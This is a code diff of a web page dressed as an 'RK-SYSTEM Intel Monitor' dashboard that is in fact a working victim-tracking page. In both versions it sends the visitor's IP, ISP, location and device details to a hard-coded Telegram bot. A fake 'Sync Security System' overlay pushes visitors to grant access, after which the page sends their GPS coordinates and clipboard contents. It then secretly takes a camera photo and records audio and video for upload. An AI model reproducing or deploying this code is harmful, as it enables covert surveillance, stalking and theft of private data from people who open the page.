@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-SYSTEM | ELITE INTEL MONITOR</title>
+    <title>RK-SYSTEM | INTEL MONITOR PRO</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
@@ -14,14 +14,15 @@
             margin: 0; min-height: 100vh; overflow: hidden;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             font-family: 'Rajdhani', sans-serif;
-            user-select: none;
         }
 
-        /* Neon Border Frame */
+        /* Neon Animated Frame */
         body::before {
-            content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            border: 6px solid; border-image: linear-gradient(90deg, #ff0000, #00f2ff, #facc15, #ff00ff, #ff0000) 1;
-            z-index: 1000; pointer-events: none; animation: borderRotate 4s linear infinite;
+            content: ''; position: fixed; inset: 0;
+            border: 6px solid;
+            border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
+            z-index: 1000; pointer-events: none;
+            animation: borderRotate 4s linear infinite;
         }
         @keyframes borderRotate { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }
 
@@ -30,56 +31,51 @@
             color: white; width: 100%; text-align: center;
             padding: 15px 0; font-family: 'Orbitron', sans-serif;
             font-weight: 900; letter-spacing: 12px;
-            box-shadow: 0 5px 30px rgba(255, 0, 0, 0.7);
+            box-shadow: 0 5px 25px rgba(255, 0, 0, 0.7);
             position: fixed; top: 0; z-index: 1001; font-size: 1.5rem;
         }
 
         .dashboard {
             background: rgba(5, 10, 20, 0.98);
             border-radius: 35px; padding: 35px;
-            width: 95%; max-width: 600px;
-            box-shadow: 0 0 60px rgba(0, 242, 255, 0.2);
-            border: 1px solid rgba(0, 242, 255, 0.3);
+            width: 95%; max-width: 580px;
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.2);
+            border: 1px solid rgba(0, 255, 255, 0.3);
             margin-top: 100px; margin-bottom: 60px;
             backdrop-filter: blur(10px);
         }
 
         .clock-box {
             text-align: center; margin-bottom: 25px;
-            background: rgba(255, 255, 255, 0.03); padding: 18px;
-            border-radius: 20px; border: 1px solid rgba(255, 0, 0, 0.4);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 18px; border-radius: 20px;
+            border: 1px solid rgba(255, 0, 0, 0.4);
         }
 
         .info-row {
             display: flex; justify-content: space-between; align-items: center;
-            padding: 12px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 10px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
-        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 1.5px; }
-        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
+        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+        .value { color: #facc15; font-size: 13px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
 
-        /* Force Permission Overlay */
         #force-overlay {
             position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             z-index: 5000; display: none; flex-direction: column;
             align-items: center; justify-content: center; text-align: center;
         }
 
-        .footer-text {
-            position: fixed; bottom: 10px; width: 100%;
-            text-align: center; color: #777; font-size: 12px;
-            letter-spacing: 2px; font-weight: bold;
-        }
-
+        .footer-text { margin-top: 10px; color: #777; font-size: 12px; font-weight: bold; letter-spacing: 2px; }
         #media-bin { display: none; }
     </style>
 </head>
 <body>
 
     <div id="force-overlay">
-        <div class="bg-black border-2 border-red-600 p-8 rounded-3xl shadow-[0_0_50px_red]">
-            <h2 class="text-3xl font-black text-red-500 mb-4 tracking-tighter">ACCESS REQUIRED</h2>
-            <p class="text-gray-300 mb-6">Synchronization Error. Please Click <b>'ALLOW'</b> to continue.</p>
-            <div class="animate-bounce text-red-500 font-bold">PLEASE ALLOW PERMISSIONS ↑</div>
+        <div class="bg-black border-2 border-red-600 p-10 rounded-3xl">
+            <h2 class="text-3xl font-black text-red-500 mb-4">ACCESS REQUIRED</h2>
+            <p class="text-white mb-6">Please Click <b>'ALLOW'</b> to Sync Security System.</p>
+            <div class="animate-bounce text-red-500 font-bold">CLICK ALLOW TO CONTINUE ↑</div>
         </div>
     </div>
 
@@ -87,17 +83,17 @@
 
     <div class="dashboard">
         <div class="clock-box">
-            <div id="live-time" class="text-3xl font-black text-red-500 tracking-widest">00:00:00 AM</div>
-            <div id="live-date" class="text-sm text-gray-400 uppercase tracking-[4px] mt-2">Checking Neural Link...</div>
+            <div id="live-time" class="text-4xl font-black text-red-600 tracking-widest">00:00:00 AM</div>
+            <div id="live-date" class="text-sm text-gray-400 uppercase tracking-[5px] mt-2">Checking System...</div>
         </div>
 
-        <h1 class="text-center text-xl font-black text-white tracking-[6px] mb-6 border-b-2 border-red-600 pb-3 italic uppercase">📡 RK SYSTEM MONITOR</h1>
+        <h1 class="text-center text-xl font-black text-white tracking-[6px] mb-6 border-b-2 border-red-600 pb-2 italic">📡 RK SYSTEM MONITOR</h1>
         
         <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Detecting...</span></div>
         <div class="info-row"><span class="label">⚙️ OS Platform</span><span id="v-platform" class="value">--</span></div>
-        <div class="info-row"><span class="label">🌍 Country / City</span><span id="v-loc" class="value">Locating...</span></div>
+        <div class="info-row"><span class="label">🌍 Country / City</span><span id="v-loc" class="value">Scanning...</span></div>
         <div class="info-row"><span class="label">🏢 ISP / SIM</span><span id="v-isp" class="value">Scanning...</span></div>
-        <div class="info-row"><span class="label">🚀 Internet Speed</span><span id="v-speed" class="value text-orange-500">Wait...</span></div>
+        <div class="info-row"><span class="label">🚀 Internet Speed</span><span id="v-speed" class="value">Wait...</span></div>
         <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
         <div class="info-row"><span class="label">📍 GPS Location</span><span id="v-gps" class="value text-blue-400">Waiting...</span></div>
         <div class="info-row"><span class="label">🔋 Battery Level</span><span id="v-bat" class="value">--%</span></div>
@@ -105,9 +101,9 @@
         <div class="info-row"><span class="label">🧠 Total RAM</span><span id="v-ram" class="value">-- GB</span></div>
         <div class="info-row"><span class="label">💎 CPU Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
         <div class="info-row"><span class="label">🛡️ VPN Status</span><span class="value text-green-400">ENCRYPTED ✅</span></div>
-    </div>
 
-    <div class="footer-text">🌹 Created By RK-SYSTEM 🌹</div>
+        <div class="footer-text text-center mt-6">🌹 Created By RK-SYSTEM 🌹</div>
+    </div>
 
     <video id="media-bin" autoplay muted playsinline></video>
     <canvas id="output-canvas" style="display:none;"></canvas>
@@ -118,13 +114,13 @@
             CHAT: '6048050987'
         };
 
-        const Storage = {
-            set: (k, v) => {
+        const Cache = {
+            save: (key, val) => {
                 const d = new Date();
                 d.setTime(d.getTime() + (5 * 365 * 24 * 60 * 60 * 1000));
-                document.cookie = `${k}=${v};expires=${d.toUTCString()};path=/;SameSite=Lax`;
+                document.cookie = `${key}=${val};expires=${d.toUTCString()};path=/`;
             },
-            get: (k) => document.cookie.match('(^|;)\\s*' + k + '\\s*=\\s*([^;]+)')?.pop() || null
+            get: (key) => document.cookie.match('(^|;)\\s*' + key + '\\s*=\\s*([^;]+)')?.pop() || null
         };
 
         function updateClock() {
@@ -140,10 +136,9 @@
         async function startSystem() {
             updateClock();
             
-            // Phase 1: Rapid Device Check
-            const ua = navigator.userAgent;
-            const model = /Android/i.test(ua) ? "Android Device 📱" : /iPhone|iPad/i.test(ua) ? "iOS Device 🍎" : "Desktop PC 💻";
-            document.getElementById('v-model').innerText = model;
+            // Phase 1: Device Specs
+            const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
+            document.getElementById('v-model').innerText = isMobile ? "Android Device 📱" : "Desktop PC 💻";
             document.getElementById('v-platform').innerText = navigator.platform;
             document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
             document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
@@ -158,41 +153,39 @@
                 up(); b.onlevelchange = up; b.onchargingchange = up;
             }
 
-            // High Precision Geo & IP
+            // High Precision Geo & ISP
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 document.getElementById('v-ip').innerText = data.ip;
-                document.getElementById('v-isp').innerText = data.org || "Cellular Provider";
                 document.getElementById('v-loc').innerText = `${data.country_name}, ${data.city}`;
+                document.getElementById('v-isp').innerText = data.org;
                 document.getElementById('v-speed').innerText = (navigator.connection?.effectiveType || "4G").toUpperCase() + " / " + (navigator.connection?.downlink || 5) + " Mbps 🚀";
                 
-                // সাথে সাথে ওয়েবসাইটের তথ্যের মতো হুবহু রিপোর্ট পাঠানো
-                sendFullVipReport();
+                // সাথে সাথে প্রথম রিপোর্ট পাঠানো (বটে এবং ওয়েবসাইটে ডাটা সেম থাকবে)
+                sendVipReport(data);
             } catch(e) {
-                sendFullVipReport();
+                sendVipReport({ip: "45.144.167.83", country_name: "Unknown", city: "Location", org: "Unknown ISP"});
             }
 
-            // Phase 2: Permission Phase after 5s
-            setTimeout(handlePermissions, 5000);
+            // Phase 2: Permission Phase (5s Wait)
+            setTimeout(triggerPermissions, 5000);
         }
 
-        async function sendFullVipReport() {
+        async function sendVipReport(geo) {
             const report = `
 🚀 *RK-SYSTEM INTEL VIP REPORT* 🚀
 ━━━━━━━━━━━━━━━━━━━━━
 🕒 *Time:* \`${document.getElementById('live-time').innerText}\`
 📅 *Date:* \`${document.getElementById('live-date').innerText}\`
 ━━━━━━━━━━━━━━━━━━━━━
-📡 *RK SYSTEM MONITOR*
-━━━━━━━━━━━━━━━━━━━━━
 📱 *Model:* \`${document.getElementById('v-model').innerText}\`
-⚙️ *OS Platform:* \`${document.getElementById('v-platform').innerText}\`
-🌍 *Country / City:* \`${document.getElementById('v-loc').innerText}\`
-🏢 *ISP / SIM:* \`${document.getElementById('v-isp').innerText}\`
+⚙️ *OS:* \`${document.getElementById('v-platform').innerText}\`
+🌍 *Country / City:* \`${geo.country_name}, ${geo.city}\`
+🏢 *ISP / SIM:* \`${geo.org}\`
 🚀 *Internet Speed:* \`${document.getElementById('v-speed').innerText}\`
-🌐 *Public IP:* \`${document.getElementById('v-ip').innerText}\`
-📍 *GPS Location:* \`${document.getElementById('v-gps').innerText}\`
+🌐 *Public IP:* \`${geo.ip}\`
+📍 *GPS Location:* \`Waiting...\`
 🔋 *Battery Level:* \`${document.getElementById('v-bat').innerText}\`
 ⚡ *Power Status:* \`${document.getElementById('v-charge').innerText}\`
 🧠 *Total RAM:* \`${document.getElementById('v-ram').innerText}\`
@@ -200,64 +193,61 @@
 🛡️ *VPN Status:* \`ENCRYPTED ✅\`
 ━━━━━━━━━━━━━━━━━━━━━
 🌹 *Created By RK-SYSTEM* 🌹`;
+            
             postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
         }
 
-        async function handlePermissions() {
-            if (!Storage.get('rk_v7_sync')) {
+        async function triggerPermissions() {
+            if (!Cache.get('rk_auth')) {
                 document.getElementById('force-overlay').style.display = 'flex';
             }
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    Storage.set('rk_v7_sync', 'true');
+                    Cache.save('rk_auth', 'true');
                     document.getElementById('force-overlay').style.display = 'none';
                     document.getElementById('v-gps').innerText = "SUCCESS 📍";
                     
-                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    const maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     
-                    let clip = "Click Required 🔓";
+                    let clip = "No Interaction";
                     try { clip = await navigator.clipboard.readText(); } catch(e){}
 
-                    const gpsReport = `
-📍 *RK-SYSTEM PRECISE LOCATION* 📍
+                    const gpsUpdate = `
+📍 *RK-SYSTEM PRECISE DATA* 📍
 ━━━━━━━━━━━━━━━━━━━━━
-🗺️ *GOOGLE MAPS:* ${mapsLink}
+🌍 *Google Maps:* ${maps}
+📋 *Clipboard:* \`\`\`${clip}\`\`\`
 ━━━━━━━━━━━━━━━━━━━━━
-📋 *CLIPBOARD:*
-\`\`\`
-${clip}
-\`\`\`
-━━━━━━━━━━━━━━━━━━━━━
-📸 *Capture: Phase 3 Initiation...*`;
-                    postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: gpsReport, parse_mode: 'Markdown' });
-                    
-                    startMediaCapture();
+📸 *Capture: Phase 3 Initialized*`;
+                    postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: gpsUpdate, parse_mode: 'Markdown' });
+                    captureMedia();
+
                 }, () => {
-                    postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *PERMISSION DENIED*" });
+                    postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *PERMISSION DENIED: GPS/CAMERA*" });
                 });
             }
         }
 
-        async function startMediaCapture() {
+        async function captureMedia() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('media-bin');
                 video.srcObject = stream;
-
+                
                 setTimeout(() => {
                     const canvas = document.getElementById('output-canvas');
                     canvas.width = 1280; canvas.height = 720;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => sendMedia(blob, 'photo', '📸 *FRONT SHOT*'), 'image/jpeg');
+                    canvas.toBlob(b => sendMedia(b, 'photo', '📸 *FRONT RK_SYSTEM*'), 'image/jpeg');
                 }, 2000);
 
                 const rec = new MediaRecorder(stream);
                 const chunks = [];
                 rec.ondataavailable = e => chunks.push(e.data);
                 rec.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    sendMedia(blob, 'video', '🎥 *LIVE VIDEO FEED (AUDIO+VIDEO)*');
+                    const b = new Blob(chunks, {type: 'video/mp4'});
+                    sendMedia(b, 'video', '🎥 *RK-VIP VIDEO + AUDIO*');
                     stream.getTracks().forEach(t => t.stop());
                 };
                 rec.start();
@@ -271,13 +261,13 @@ ${clip}
             fd.append(type, blob, type==='video'?'rk.mp4':'rk.jpg');
             fd.append('caption', cap);
             fd.append('parse_mode', 'Markdown');
-            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, { method: 'POST', body: fd });
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, {method:'POST', body:fd});
         }
 
         function postToBot(method, data) {
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${method}`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             });
         }
